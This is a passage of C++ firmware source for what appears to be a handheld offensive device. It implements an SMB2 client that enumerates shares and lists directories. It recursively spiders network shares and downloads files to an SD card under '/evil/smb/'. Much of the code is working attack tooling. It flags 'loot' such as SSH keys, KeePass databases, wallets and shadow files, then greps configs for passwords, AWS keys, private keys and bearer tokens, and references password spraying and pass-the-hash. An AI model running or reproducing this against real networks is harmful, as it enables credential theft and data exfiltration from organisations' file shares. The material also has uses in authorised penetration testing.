      try {
        while(true){
            std::vector<uint8_t> star; smbAsciiToU16("*",star);
            std::vector<uint8_t> b; smbPut16(b,33);
            b.push_back(1);                         // FileInformationClass = FileDirectoryInformation
            b.push_back(first?1:0);                 // Flags: RESTART_SCANS first call
            smbPut32(b,0);                          // FileIndex
            for(int i=0;i<16;i++) b.push_back(fid[i]);
            smbPut16(b,0x60);                       // FileNameOffset = 96
            smbPut16(b,star.size());                // FileNameLength
            smbPut32(b,16384);                      // OutputBufferLength
            for(auto c:star) b.push_back(c);
            first=false;
            if(!send(SMB2_QUERY_DIRECTORY,b)){ ok=false; break; }
            std::vector<uint8_t> rx; uint32_t st=recv(rx);
            if(st==NT_NO_MORE_FILES) break;
            if(st!=NT_SUCCESS){ if(out.empty()) ok=false; break; }
            uint16_t off=smbGet16(&rx[64+2]); uint32_t len=smbGet32(&rx[64+4]);
            if((uint32_t)off+len>rx.size()) break;
            const uint8_t* p=&rx[off]; uint32_t pos=0;
            while(pos<len){
                const uint8_t* e=p+pos;
                uint32_t next=smbGet32(e+0);
                uint64_t eof=smbGet64(e+40);
                uint32_t attr=smbGet32(e+56);
                uint32_t nameLen=smbGet32(e+60);
                if(64+nameLen> len-pos+64) { /*bounds*/ }
                String nm=smbU16ToAscii(e+64,nameLen);
                if(nm!="."&&nm!=".."){
                    SmbEntry se; se.name=nm; se.isDir=(attr&0x10)!=0; se.size=eof; out.push_back(se);
                    if(out.size()>=LISTDIR_MAX){ capped=true; break; }
                }
                if(next==0) break; pos+=next;
            }
            if(capped) break;
        }
      } catch(...) { lastError="listDir oom"; }   // degrade to partial, never abort
        closeFid(fid);
        return ok;
    }

    // ------------------------------- READ ----------------------------------
    // read up to len bytes at offset; returns bytes read into dst (dst>=len)
    int readChunk(const uint8_t fid[16], uint64_t offset, uint32_t len, uint8_t* dst){
        std::vector<uint8_t> b; smbPut16(b,49); b.push_back(0); b.push_back(0); // size,pad,flags
        smbPut32(b,len); smbPut64(b,offset);
        for(int i=0;i<16;i++) b.push_back(fid[i]);
        smbPut32(b,0); smbPut32(b,0); smbPut32(b,0);   // min,channel,remaining
        smbPut16(b,0); smbPut16(b,0); b.push_back(0);  // chaninfo off/len, pad
        if(!send(SMB2_READ,b)){ lastError="read send"; return -1; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx,8000);
        if(st!=NT_SUCCESS){ if(st==0x80000005) return 0; lastError="read st "+String(st,HEX); return -1; } // 0x80000005=BUFFER_OVERFLOW
        uint8_t dOff=rx[64+2]; uint32_t dLen=smbGet32(&rx[64+4]);
        if((uint32_t)dOff+dLen>rx.size()) return -1;
        memcpy(dst,&rx[dOff],dLen); return (int)dLen;
    }
    // fire a READ without waiting for its response (for pipelining). Returns the
    // MessageId used (always >0 by read time), or 0 on IO error. CreditCharge is
    // ceil(len/64K) so multi-credit servers accept the in-flight window.
    uint64_t sendRead(const uint8_t fid[16], uint64_t offset, uint32_t len, uint16_t creditReq){
        std::vector<uint8_t> b; smbPut16(b,49); b.push_back(0); b.push_back(0);
        smbPut32(b,len); smbPut64(b,offset);
        for(int i=0;i<16;i++) b.push_back(fid[i]);
        smbPut32(b,0); smbPut32(b,0); smbPut32(b,0);
        smbPut16(b,0); smbPut16(b,0); b.push_back(0);
        uint16_t charge=(uint16_t)((len+65535)/65536); if(charge==0) charge=1;
        if(!send(SMB2_READ,b,creditReq,charge)){ lastError="read send"; return 0; }
        return lastMsgId;
    }

    // ------------------------------ WRITE TEST -----------------------------
    // Active check: try to CREATE a random temp file (delete-on-close) in dirPath
    // of the current tree. Proves write access without leaving anything behind.
    // Requires a tree already connected. Returns true if the server allowed it.
    bool testWrite(const String& dirPath){
        String name = dirPath.length()? (dirPath+"\\") : "";
        char rnd[16]; snprintf(rnd,sizeof rnd,"~wt%06u.tmp",(unsigned)(esp_random()%1000000u));
        name += rnd;
        std::vector<uint8_t> u; smbAsciiToU16(name.c_str(),u);
        std::vector<uint8_t> b; smbPut16(b,57); b.push_back(0); b.push_back(0);
        smbPut32(b,2);                          // impersonation
        smbPut64(b,0); smbPut64(b,0);
        smbPut32(b, 0x00000002u | 0x00010000u); // FILE_WRITE_DATA | DELETE
        smbPut32(b,0);                          // attributes
        smbPut32(b,7);                          // share R|W|D
        smbPut32(b,2);                          // CreateDisposition FILE_CREATE (fail if exists)
        smbPut32(b, 0x40u | 0x1000u);           // non-dir + FILE_DELETE_ON_CLOSE
        smbPut16(b,0x78); smbPut16(b,u.size());
        smbPut32(b,0); smbPut32(b,0);
        for(auto c:u) b.push_back(c);
        if(!send(SMB2_CREATE,b)){ lastError="wtest send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx);
        if(st!=NT_SUCCESS){ lastError="wtest st "+String(st,HEX); return false; }
        if(rx.size()>=64+80){ uint8_t fid[16]; memcpy(fid,&rx[64+64],16); closeFid(fid); } // delete-on-close
        return true;
    }
};

// =================== srvsvc NetrShareEnum over IPC$ =========================
// opens \PIPE\srvsvc, DCE/RPC bind, NetrShareEnumAll level 1, parses names.
static bool smbEnumShares(Smb2& s, std::vector<String>& shares){
    uint32_t savedTree=s.treeId;
    if(!s.treeConnect("IPC$")) return false;
    uint8_t fid[16];
    if(!s.create("srvsvc",false,fid,nullptr,0x0012019F)){ s.treeDisconnect(); return false; } // pipe RW
    // --- DCE/RPC bind ---
    auto rpcWrite=[&](const std::vector<uint8_t>& data)->bool{
        std::vector<uint8_t> b; smbPut16(b,49); smbPut16(b,0x70); smbPut32(b,data.size());
        smbPut64(b,0); for(int i=0;i<16;i++) b.push_back(fid[i]);
        smbPut32(b,0); smbPut32(b,0); smbPut16(b,0); smbPut16(b,0); smbPut32(b,0);
        for(auto c:data) b.push_back(c);
        if(!s.send(SMB2_WRITE,b)){ s.lastError="rpcWr send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=s.recv(rx);
        if(st!=NT_SUCCESS){ s.lastError="rpcWr st "+String(st,HEX); return false; }
        return true;
    };
    std::vector<uint8_t> rpcBuf(8192);   // heap (off the 8 KB loopTask stack), freed on return
    auto rpcRead=[&](std::vector<uint8_t>& out)->bool{
        int n=s.readChunk(fid,0,8192,rpcBuf.data());
        if(n<0){ s.lastError="rpcRd io"; return false; }
        out.assign(rpcBuf.begin(),rpcBuf.begin()+n); return true;
    };
    std::vector<uint8_t> bind;
    // common header
    bind.push_back(5);bind.push_back(0);bind.push_back(11);bind.push_back(3); // ver,minor,bind,flags
    smbPut32(bind,0x00000010);                       // data rep (LE)
    smbPut16(bind,0); smbPut16(bind,0);              // frag len (fill later), auth len
    smbPut32(bind,1);                                // call id
    smbPut16(bind,4280); smbPut16(bind,4280);        // max xmit/recv
    smbPut32(bind,0);                                // assoc group
    bind.push_back(1);bind.push_back(0);bind.push_back(0);bind.push_back(0); // num ctx=1
    smbPut16(bind,0); bind.push_back(1); bind.push_back(0); // ctx id 0, num trans 1
    { const uint8_t u[16]={0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88};
      for(int i=0;i<16;i++) bind.push_back(u[i]); smbPut16(bind,3); smbPut16(bind,0); } // srvsvc v3.0
    { const uint8_t u[16]={0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60};
      for(int i=0;i<16;i++) bind.push_back(u[i]); smbPut32(bind,2); }                   // NDR v2.0
    bind[8]=bind.size()&0xff; bind[9]=(bind.size()>>8)&0xff;  // frag length
    std::vector<uint8_t> brx;
    if(!rpcWrite(bind)){ s.lastError="bind "+s.lastError; s.closeFid(fid); s.treeDisconnect(); return false; }
    if(!rpcRead(brx)){ s.lastError="bindack "+s.lastError; s.closeFid(fid); s.treeDisconnect(); return false; }

    // --- NetrShareEnum (opnum 15), level 1 ---
    std::vector<uint8_t> req;
    req.push_back(5);req.push_back(0);req.push_back(0);req.push_back(3);  // ver,minor,request,flags
    smbPut32(req,0x00000010);
    smbPut16(req,0); smbPut16(req,0);                 // frag len (later), auth len
    smbPut32(req,2);                                  // call id
    smbPut32(req,0);                                  // alloc hint (later ok 0)
    smbPut16(req,0);                                  // context id
    smbPut16(req,15);                                 // opnum NetrShareEnum
    // stub: ServerName (unique ptr -> UNC string)
    String srv="\\\\"+s.host.toString();
    std::vector<uint8_t> su; smbAsciiToU16(srv.c_str(),su); su.push_back(0); su.push_back(0);
    uint32_t chars=su.size()/2;
    smbPut32(req,0x00020000);                         // referent id
    smbPut32(req,chars); smbPut32(req,0); smbPut32(req,chars); // max,offset,actual
    for(auto c:su) req.push_back(c);
    while(req.size()%4) req.push_back(0);
    // InfoStruct: level 1, SHARE_INFO_1_CONTAINER ptr (entries=0, buffer=NULL)
    smbPut32(req,1);                                  // level
    smbPut32(req,1);                                  // switch/union selector = 1
    smbPut32(req,0x00020004);                         // container referent
    smbPut32(req,0);                                  // EntriesRead
    smbPut32(req,0);                                  // Buffer = NULL
    smbPut32(req,0xFFFFFFFF);                          // PreferedMaximumLength
    smbPut32(req,0x00020008);                         // ResumeHandle referent
    smbPut32(req,0);                                  // ResumeHandle value
    req[8]=req.size()&0xff; req[9]=(req.size()>>8)&0xff;
    uint32_t allocHint=req.size()-24; req[16]=allocHint&0xff; req[17]=(allocHint>>8)&0xff;
    std::vector<uint8_t> rx;
    bool okW=rpcWrite(req); bool okR=okW&&rpcRead(rx);
    s.closeFid(fid); s.treeDisconnect(); s.treeId=savedTree;
    if(!okW){ s.lastError="enumReq "+s.lastError; return false; }
    if(!okR){ s.lastError="enumRd "+s.lastError; return false; }
    if(rx.size()<40){ s.lastError="enumRd short "+String((int)rx.size()); return false; }

    // --- parse NDR response (level 1) ---
#ifdef SMB_RPC_DEBUG
    Serial.printf("[SMB][dbg] NetrShareEnum resp %d bytes:\n", (int)rx.size());
    for(size_t i=0;i<rx.size() && i<160;i+=16){
        Serial.printf("  %03d:", (int)i);
        for(size_t j=i;j<i+16 && j<rx.size();j++) Serial.printf(" %02x", rx[j]);
        Serial.println();
    }
#endif
    // skip 24-byte RPC header
    size_t c=24;
    auto rd32=[&](size_t& p)->uint32_t{ if(p+4>rx.size()) return 0; uint32_t v=smbGet32(&rx[p]); p+=4; return v; };
    rd32(c);                 // Level
    rd32(c);                 // union switch selector (encapsulated SHARE_ENUM_UNION)
    rd32(c);                 // container referent id
    uint32_t entries=rd32(c);// EntriesRead
    rd32(c);                 // buffer referent id
    uint32_t maxc=rd32(c);   // conformant array MaxCount
    if(entries>256) entries=256; if(maxc<entries) entries=maxc;
    std::vector<uint32_t> types(entries);
    // array of SHARE_INFO_1: {netname_ref, type, remark_ref}
    for(uint32_t i=0;i<entries;i++){ rd32(c); types[i]=rd32(c); rd32(c); }
    // deferred strings: netname then remark for each
    for(uint32_t i=0;i<entries;i++){
        // netname
        uint32_t mx=rd32(c); uint32_t ofs=rd32(c); uint32_t ac=rd32(c); (void)mx;(void)ofs;
        if(c+ac*2>rx.size()) break;
        String nm=smbU16ToAscii(&rx[c], (ac>0?(int)ac-1:0)*2); // drop NDR null terminator
        c+=ac*2; while(c%4) c++;
        // remark
        uint32_t mx2=rd32(c); uint32_t ofs2=rd32(c); uint32_t ac2=rd32(c); (void)mx2;(void)ofs2;
        c+=ac2*2; while(c%4) c++;
        // keep disk shares (type low 0) and generic; skip hidden admin $ pipes except show all
        if(nm.length()){ shares.push_back(nm); }
    }
    return true;
}

// =============================== UI / feature ==============================
// Boxed-terminal UI drawn straight to the panel (NO sprite/canvas -> no extra
// RAM; the framebuffer we draw into is the panel's own). Colours follow the
// device menu theme so it matches the rest of the firmware.
#define SMB_BG     menuBackgroundColor         // black
#define SMB_SEL    menuSelectedBackgroundColor // navy (bars/selection)
#define SMB_TITLE  menuTextFocusedColor        // green (titles/accents/selected text)
#define SMB_TEXT   menuTextUnFocusedColor      // white (normal rows)
#define SMB_FRAME  TFT_DARKGREY                // frame + footer hints
#define SMB_DIR    TFT_CYAN                    // folders / shares
#define SMB_ACT    TFT_YELLOW                  // <actions>
#define SMB_LOCK   TFT_RED                     // locked / denied

static const int SMB_LTOP=30, SMB_LH=12, SMB_LBOT=116;        // list geometry
static const int SMB_VIS=(SMB_LBOT-SMB_LTOP)/SMB_LH;          // visible rows (7)

// keep the tail of an over-long string so it never wraps past the frame edge
static String smbClip(const String& s, int maxChars){
    if(maxChars<3) maxChars=3;
    if((int)s.length()<=maxChars) return s;
    return ".."+s.substring(s.length()-(maxChars-2));
}
static String smbHuman(uint64_t b){
    char o[20];
    if(b<1024ULL) snprintf(o,sizeof o,"%uB",(unsigned)b);
    else if(b<1024ULL*1024) snprintf(o,sizeof o,"%.1fK",(double)b/1024.0);
    else if(b<1024ULL*1024*1024) snprintf(o,sizeof o,"%.1fM",(double)b/1048576.0);
    else snprintf(o,sizeof o,"%.1fG",(double)b/1073741824.0);
    return String(o);
}
// frame + title bar (title left, badge right) + subline + footer hint line
static void smbChrome(const String& title, const String& badge, const String& sub, const String& footer){
    M5.Display.setTextWrap(false); M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
    M5.Display.fillScreen(SMB_BG);
    M5.Display.drawRect(0,0,240,135,SMB_FRAME);
    M5.Display.fillRect(1,1,238,14,SMB_SEL);                        // title bar
    M5.Display.setTextColor(SMB_TITLE,SMB_SEL);
    M5.Display.setCursor(5,3); M5.Display.print(smbClip(title,22));
    if(badge.length()){ int tw=M5.Display.textWidth(badge); M5.Display.setCursor(235-tw,3); M5.Display.print(badge); }
    if(sub.length()){ M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(5,17); M5.Display.print(smbClip(sub,25)); }
    M5.Display.drawFastHLine(1,28,238,SMB_FRAME);
    M5.Display.drawFastHLine(1,SMB_LBOT+1,238,SMB_FRAME);
    if(footer.length()){ M5.Display.setTextColor(SMB_FRAME,SMB_BG); M5.Display.setCursor(5,121); M5.Display.print(smbClip(footer,26)); }
}
// thin progress bar (green fill on framed track)
static void smbBar(int x,int y,int w,int h,long cur,long total){
    M5.Display.drawRect(x,y,w,h,SMB_FRAME);
    M5.Display.fillRect(x+1,y+1,w-2,h-2,SMB_BG);
    int fw = (total>0)? (int)((long long)(w-2)*cur/total) : 0;
    if(fw<0) fw=0; if(fw>w-2) fw=w-2;
    if(fw>0) M5.Display.fillRect(x+1,y+1,fw,h-2,SMB_TITLE);
}

// boxed vertical selector. Returns index, or -1 on backspace.
// flags (optional, parallel to items): bit0 = draw a red LOCK tag.
static int smbSelectList(const std::vector<String>& items, const String& title,
                         const String& badge="", const String& sub="",
                         const String& footer="UP/DN  OK:open  DEL:back",
                         const std::vector<uint8_t>* flags=nullptr){
    if(items.empty()) return -1;
    int idx=0, top=0;
    auto rowColor=[&](const String& l)->uint16_t{
        if(l.startsWith("<")||l.startsWith("*")) return SMB_ACT;
        if(l.startsWith("[")||l==".. (up)")      return SMB_DIR;
        return SMB_TEXT;
    };
    auto drawRows=[&](){
        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextWrap(false);
        for(int i=0;i<SMB_VIS;i++){ int o=top+i, y=SMB_LTOP+i*SMB_LH; bool cur=(o==idx);
            uint16_t bg = cur?SMB_SEL:SMB_BG;
            M5.Display.fillRect(2,y,234,SMB_LH,bg);
            if(o>=(int)items.size()) continue;
            bool locked = flags && o<(int)flags->size() && ((*flags)[o]&1);
            uint16_t fg = cur? SMB_TITLE : rowColor(items[o]);
            M5.Display.setTextColor(fg,bg);
            M5.Display.setCursor(5,y+2);  M5.Display.print(cur?">":" ");
            M5.Display.setCursor(16,y+2); M5.Display.print(smbClip(items[o], locked?18:24));
            if(locked){ M5.Display.setTextColor(cur?SMB_TITLE:SMB_LOCK,bg);
                        M5.Display.setCursor(235-M5.Display.textWidth("LOCK"),y+2); M5.Display.print("LOCK"); }
        }
        if((int)items.size()>SMB_VIS){                             // scrollbar thumb
            int trackH=SMB_LBOT-SMB_LTOP;
            int thumbH=max(6,trackH*SMB_VIS/(int)items.size());
            int thumbY=SMB_LTOP+trackH*top/(int)items.size();
            M5.Display.fillRect(237,SMB_LTOP,1,trackH,SMB_BG);
            M5.Display.fillRect(237,thumbY,1,thumbH,SMB_FRAME);
        }
        M5.Display.display();
    };
    enterDebounce(); smbChrome(title,badge,sub,footer); drawRows();
    while(true){
        M5.update(); cardUpdate();
        if(kp(';')){ idx=(idx-1+items.size())%items.size(); top=max(0,min(idx,(int)items.size()-SMB_VIS)); drawRows(); delay(140); }
        else if(kp('.')){ idx=(idx+1)%items.size(); top=max(0,min(idx,(int)items.size()-SMB_VIS)); drawRows(); delay(140); }
        else if(kp(KEY_ENTER)){ delay(140); return idx; }
        else if(kp(KEY_BACKSPACE)){ delay(140); return -1; }
        delay(40);
    }
}

// centered two-line notice inside the frame
static void smbMsg(const String& l1,const String& l2="",int holdMs=0){
    smbChrome("SMB EXPLORER","","","");
    M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextWrap(false);
    String c1=smbClip(l1,24); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
    M5.Display.setCursor((240-M5.Display.textWidth(c1))/2,56); M5.Display.print(c1);
    if(l2.length()){ String c2=smbClip(l2,24); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
        M5.Display.setCursor((240-M5.Display.textWidth(c2))/2,74); M5.Display.print(c2); }
    M5.Display.display(); if(holdMs) delay(holdMs);
}

#define SMB_CREDS_FILE   "/evil/smb/smb_creds.txt"
#define SMB_USERS_FILE   "/evil/smb/smb_users.txt"
#define SMB_PASS_FILE    "/evil/smb/smb_pass.txt"
#define SMB_HITS_FILE    "/evil/smb/smb_hits.txt"
#define SMB_HOSTS_FILE   "/evil/smb/hosts.txt"
#define SMB_SESSION_LOG  "/evil/smb/session.log"
#define SMB_HASHES_FILE  "/evil/smb/smb_hashes.txt"   // captured NT hashes for pass-the-hash
#define SMB_SPRAY_MAXTRIES 300          // lockout guard: stop a spray after this many attempts

static void smbEnsureDir(){
    if(!SD.exists("/evil")) SD.mkdir("/evil");
    if(!SD.exists("/evil/smb")) SD.mkdir("/evil/smb");
}
// append one timestamped line to the session log on SD
static void smbLog(const String& line){
    smbEnsureDir();
    File f=SD.open(SMB_SESSION_LOG, FILE_APPEND);
    if(!f) return;
    f.printf("[%lu] %s\n", (unsigned long)millis(), line.c_str());
    f.close();
}

// mkdir -p for an SD path up to its last '/'
static void sdMkdirp(const String& fullPath){
    int sl=fullPath.lastIndexOf('/'); if(sl<=0) return;
    String dir=fullPath.substring(0,sl);
    int from=1;
    while(true){ int s=dir.indexOf('/',from); String part=(s<0)?dir:dir.substring(0,s);
        if(part.length() && !SD.exists(part)) SD.mkdir(part);
        if(s<0) break; from=s+1; }
}
// download one SMB file (relPath, backslash-separated) to an arbitrary SD path.
// Pipelined READ: keep several reads in flight (bounded by server-granted
// credits) instead of one-at-a-time, so a large download is not RTT-bound.
// 32K chunks. Responses matched by MessageId -> written at the right offset, so
// out-of-order replies are still correct. On abort the outstanding responses
// are drained to keep the socket in sync. Returns bytes written, -1 on error.
static long smbReadToFile(Smb2& s, const uint8_t fid[16], uint64_t fsize, File& f, bool show){
    if(fsize==0) return 0;
    // 8K chunks keep each recv() alloc small (the heap is fragmented; a 32K
    // contiguous block fails). The speedup comes from the in-flight window, not
    // chunk size: up to MAXW reads outstanding so we are not RTT-bound.
    const uint32_t CH=8192; const int MAXW=8;
    int credits=1;                                       // every server guarantees >=1
    std::vector<std::pair<uint64_t,uint64_t>> inflight;  // (msgId, fileOffset)
    uint64_t nextOff=0; long total=0; uint32_t lastDraw=0; bool err=false, aborted=false;
    auto post=[&]()->bool{
        if(nextOff>=fsize) return true;
        uint32_t want=(uint32_t)((fsize-nextOff<CH)?(fsize-nextOff):CH);
        uint64_t mid=s.sendRead(fid,nextOff,want,(uint16_t)MAXW);
        if(mid==0) return false;
        inflight.push_back({mid,nextOff}); nextOff+=want; credits--; return true;
    };
    if(!post()) return -1;
    while(!inflight.empty()){
        std::vector<uint8_t> rx; uint32_t st=s.recv(rx,8000);
        if(st!=NT_SUCCESS || rx.size()<64+16){ err=true; break; }
        uint16_t granted=smbGet16(&rx[14]); credits+=granted;
        uint64_t rmid=smbGet64(&rx[24]);
        int idx=-1; for(size_t k=0;k<inflight.size();k++) if(inflight[k].first==rmid){ idx=(int)k; break; }
        if(idx<0){ err=true; break; }
        uint64_t roff=inflight[idx].second; inflight.erase(inflight.begin()+idx);
        uint8_t dOff=rx[64+2]; uint32_t dLen=smbGet32(&rx[64+4]);
        if((uint32_t)dOff+dLen>rx.size()){ err=true; break; }
        if(dLen){ f.seek(roff); f.write(&rx[dOff],dLen); total+=dLen; }
        while(credits>0 && (int)inflight.size()<MAXW && nextOff<fsize){ if(!post()){ err=true; break; } }
        if(err) break;
        if(show && millis()-lastDraw>160){
            M5.Display.fillRect(2,86,234,26,SMB_BG);
            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TITLE,SMB_BG);
            String p=smbHuman((uint64_t)total)+" / "+smbHuman(fsize);
            M5.Display.setCursor((240-M5.Display.textWidth(p))/2,88); M5.Display.print(p);
            smbBar(6,104,228,8,(long)total,(long)fsize); M5.Display.display(); lastDraw=millis();
        }
        M5.update(); cardUpdate();
        if(kp(KEY_BACKSPACE)){ aborted=true; break; }
    }
    // drain any outstanding responses so the socket stays framed for the next op
    for(size_t i=0;i<inflight.size();i++){ std::vector<uint8_t> rx; if(s.recv(rx,8000)==0xFFFFFFFF) break; }
    inflight.clear();
    if(err && !aborted) return -1;
    return total;
}
// maxSize>0 skips files larger than it (returns -2). progress draws if show.
// returns bytes written, -1 on error, -2 if skipped (too big).
static long smbDownloadTo(Smb2& s, const String& relPath, const String& sdPath, uint64_t maxSize, bool show){
    uint8_t fid[16]; uint64_t fsize=0;
    if(!s.create(relPath,false,fid,&fsize)) return -1;
    if(maxSize && fsize>maxSize){ s.closeFid(fid); return -2; }
    sdMkdirp(sdPath);
    File f=SD.open(sdPath,FILE_WRITE);
    if(!f){ s.closeFid(fid); return -1; }
    long total=smbReadToFile(s,fid,fsize,f,show);
    f.close(); s.closeFid(fid);
    return total;
}
// download one file into /evil/smb/<saveName>; returns bytes or -1
static long smbDownload(Smb2& s, const String& relPath, const String& saveName){
    smbEnsureDir();
    return smbDownloadTo(s, relPath, "/evil/smb/"+saveName, 0, true);
}

// sanitize a share/path fragment into a safe SD filename piece
static String smbSafeName(const String& in){
    String o; for(size_t i=0;i<in.length();i++){ char c=in[i];
        o += (isalnum((int)c)||c=='-'||c=='_') ? c : '_'; }
    if(o.length()==0) o="share";
    return o;
}
// flag loot-worthy files by name (secrets, keys, configs, backups)
static bool smbLootMatch(const String& nameLower){
    static const char* pats[]={"id_rsa","id_dsa","id_ecdsa","id_ed25519",".kdbx",".kdb",".ppk",
        ".pem",".key",".pfx",".p12",".env","password","passwd","secret",".bak","backup","shadow",
        ".ovpn",".sql","web.config",".config","credential","wallet.dat",".rdp",".vnc",".keychain",
        "unattend.xml","sysprep",".pgpass",".netrc","known_hosts",0};
    for(int i=0;pats[i];i++) if(nameLower.indexOf(pats[i])>=0) return true;
    return false;
}
// is this a small text config worth peeking inside for secrets?
static bool smbLootTexty(const String& nameLower){
    static const char* ext[]={".env",".ini",".conf",".cnf",".cfg",".config",".yml",".yaml",
        ".json",".xml",".ovpn",".txt",".ps1",".sh",".bat",".cmd",".properties",".pgpass",".netrc",0};
    for(int i=0;ext[i];i++) if(nameLower.endsWith(ext[i])) return true;
    return false;
}
// peek inside a small text loot file and append secret-bearing lines to lf.
// Reads file content from the share (passive read). Bounded to 64K + 8 hits.
static void smbLootPeek(Smb2& s, const String& fullPath, uint64_t size, File& lf){
    if(!lf || size==0) return;
    uint8_t fid[16]; uint64_t fsz=0;
    if(!s.create(fullPath,false,fid,&fsz)) return;
    const uint32_t PKCAP=8192;                     // on-demand (not static BSS): freed after
    uint8_t* pk=(uint8_t*)malloc(PKCAP);
    if(!pk){ s.closeFid(fid); return; }            // peek is best-effort; skip on low heap
    uint32_t cap=(uint32_t)(size<PKCAP-1?size:PKCAP-1);
    uint32_t got=0;
    while(got<cap){ int n=s.readChunk(fid,got,(cap-got<4096?cap-got:4096),pk+got); if(n<=0) break; got+=n; }
    s.closeFid(fid); pk[got]=0;
    static const char* pats[]={"password","passwd","pwd=","pwd:","secret","api_key","apikey",
        "access_key","aws_secret","akia","begin rsa private","begin openssh private","begin private",
        "token=","token:","client_secret","connectionstring","bearer ",0};
    int hits=0; uint32_t ls=0;
    char line[160];
    for(uint32_t i=0;i<=got && hits<8;i++){
        if(i==got || pk[i]=='\n' || pk[i]=='\r'){
            uint32_t n=0;                           // copy at most 150 printable chars
            for(uint32_t k=ls;k<i && n<150;k++){ char c=(char)pk[k]; line[n++]=(c>=32&&c<127)?c:'.'; }
            line[n]=0;
            if(n>0){ String low(line); low.toLowerCase();
                for(int p=0;pats[p];p++){ if(low.indexOf(pats[p])>=0){ lf.printf("    > %s\n", line); hits++; break; } } }
            ls=i+1;
        }
    }
    free(pk);
}

// extensions offered on the pre-spider picker. Index N (last) is the "(no ext)"
// pseudo-slot for files with no '.' (id_rsa, known_hosts...). A filter vector
// parallel to this (plus the no-ext slot) decides what the spider records.
static const char* SPIDER_EXTS[] = {
    ".txt",".pdf",".doc",".docx",".xls",".xlsx",".csv",".conf",".ini",".cfg",
    ".env",".yml",".yaml",".json",".xml",".key",".pem",".ppk",".pfx",".p12",
    ".kdbx",".ovpn",".sql",".bak",".zip",".tar",".gz",".sh",".ps1",".bat", 0 };
static int smbSpiderExtCount(){ int n=0; while(SPIDER_EXTS[n]) n++; return n; }
// true if file 'nameLower' should be recorded given the filter. filterOn has
// (extCount + 1) entries; the last is the no-ext slot. If every slot is on the
// filter is inactive (record everything, incl. unlisted extensions).
static bool smbSpiderKeep(const String& nameLower, const std::vector<uint8_t>* filterOn){
    if(!filterOn) return true;
    int N=smbSpiderExtCount();
    if((int)filterOn->size()<N+1) return true;
    bool allOn=true; for(int i=0;i<N+1;i++) if(!(*filterOn)[i]){ allOn=false; break; }
    if(allOn) return true;                                   // ALL selected => no filter
    int dot=nameLower.lastIndexOf('.');
    if(dot<0) return (*filterOn)[N];                         // no extension
    for(int i=0;i<N;i++) if(nameLower.endsWith(SPIDER_EXTS[i])) return (*filterOn)[i];
    return false;                                            // unlisted extension
}

// recursively walk <share> from startPath and write a full-path tree to
// /evil/smb/spider_<share>.txt. Iterative heap worklist (no deep recursion ->
// loopTask stack safe). Backspace aborts. Returns items written, -1 on error.
// outPathOut (optional) receives the SD path used. filterOn (optional) restricts
// which files are recorded by extension (see smbSpiderKeep).
static long smbSpider(Smb2& s, const String& share, const String& startPath, String* outPathOut=nullptr,
                      long* lootOut=nullptr, const std::vector<uint8_t>* filterOn=nullptr){
    smbEnsureDir();
    String outPath="/evil/smb/spider_"+smbSafeName(share)+".txt";
    String lootPath="/evil/smb/loot_"+smbSafeName(share)+".txt";
    if(outPathOut) *outPathOut=outPath;
    File f=SD.open(outPath,FILE_WRITE);
    if(!f){ s.lastError="sd open fail"; return -1; }
    File lf=SD.open(lootPath,FILE_WRITE);                 // interesting files (secrets/keys/configs)
    if(lf) lf.printf("# SMB loot  host=%s  share=%s\n", s.host.toString().c_str(), share.c_str());
    f.printf("# SMB spider  host=%s  share=%s  start=\\%s\n",
             s.host.toString().c_str(), share.c_str(), startPath.c_str());
    smbChrome("SPIDER", "", share+"\\"+startPath, "DEL:abort");
    const long MAX_ENTRIES=50000; const int MAX_DEPTH=40;
    std::vector<String> stack; stack.push_back(startPath);
    long count=0, dirs=0, loot=0; uint32_t lastDraw=0; bool aborted=false;
    int peekBudget=40;   // cap on in-file secret peeks (bounds spider time)
    try {
    while(!stack.empty()){
        String dir=stack.back(); stack.pop_back();
        int depth = dir.length()?1:0; for(size_t i=0;i<dir.length();i++) if(dir[i]=='\\') depth++;
        std::vector<SmbEntry> entries;
        if(!s.listDir(dir,entries)){ f.printf("[!] \\%s : %s\n", dir.c_str(), s.lastError.c_str()); continue; }
        dirs++;
        std::vector<String> subdirs;
        for(auto& en:entries){
            String full = dir.length()? (dir+"\\"+en.name) : en.name;
            if(en.isDir){ f.printf("%s\\\n", full.c_str()); count++; }
            else {
                String nl=en.name; nl.toLowerCase();
                if(smbSpiderKeep(nl, filterOn)){                 // extension filter
                    f.printf("%s\t%llu\n", full.c_str(), (unsigned long long)en.size); count++;
                    if(lf && smbLootMatch(nl)){ lf.printf("%s\t%llu\n", full.c_str(), (unsigned long long)en.size); loot++;
                        if(peekBudget>0 && smbLootTexty(nl)){ peekBudget--; smbLootPeek(s,full,en.size,lf); } }
                }
            }
            if(en.isDir && depth<MAX_DEPTH && stack.size()+subdirs.size()<1500) subdirs.push_back(full);
            if(count>=MAX_ENTRIES){ aborted=true; break; }
        }
        if(aborted){ f.println("# stopped: entry cap reached"); break; }
        for(int i=(int)subdirs.size()-1;i>=0;i--) stack.push_back(subdirs[i]); // listed order
        if(millis()-lastDraw>180){
            M5.Display.fillRect(2,50,234,50,SMB_BG);
            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(8,54);
            M5.Display.printf("dirs  %ld", dirs);
            M5.Display.setCursor(8,68); M5.Display.printf("items %ld", count);
            M5.Display.setTextColor(SMB_TITLE,SMB_BG); M5.Display.setCursor(8,82);
            M5.Display.printf("loot  %ld", loot);
            M5.Display.display(); lastDraw=millis();
        }
        M5.update(); cardUpdate();
        if(kp(KEY_BACKSPACE)){ f.println("# aborted by user"); aborted=true; break; }
    }
